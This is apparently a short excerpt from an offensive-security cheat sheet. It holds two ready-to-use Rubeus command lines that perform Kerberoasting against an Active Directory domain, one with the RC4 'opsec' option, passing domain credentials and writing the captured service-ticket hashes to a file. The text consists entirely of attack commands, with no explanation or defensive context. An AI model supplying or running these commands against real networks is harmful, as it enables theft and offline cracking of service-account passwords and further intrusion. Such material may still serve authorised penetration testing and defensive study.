...
Rubeus.exe kerberoast /rc4opsec /domain:<DOMAIN> /creduser:'<DOMAIN>\<USERNAME>' /credpassword:'<PASSWORD>' /outfile:<FILE_PATH>
Rubeus.exe kerberoast /domain:<DOMAIN> /creduser:'<DOMAIN>\<USERNAME>' /credpassword:'<PASSWORD>' /outfile:<FILE_PATH>
